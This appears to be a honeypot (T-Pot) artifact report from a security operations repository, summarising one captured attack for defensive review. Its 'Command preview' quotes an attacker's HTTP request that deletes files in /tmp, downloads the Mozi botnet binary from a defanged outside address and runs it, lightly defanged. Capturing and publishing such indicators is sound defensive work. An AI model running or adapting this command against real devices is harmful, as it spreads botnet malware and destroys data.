# 541924a48d288115f8664af967ecb319c9c0ad953eb2dc2c78c6265df975a1e5

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `541924a48d288115f8664af967ecb319c9c0ad953eb2dc2c78c6265df975a1e5` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
GET /shell?cd+/tmp;rm+-rf+*;wget+hxxp://182[.]233[.]211[.]XXX:44410/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1[.]1
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
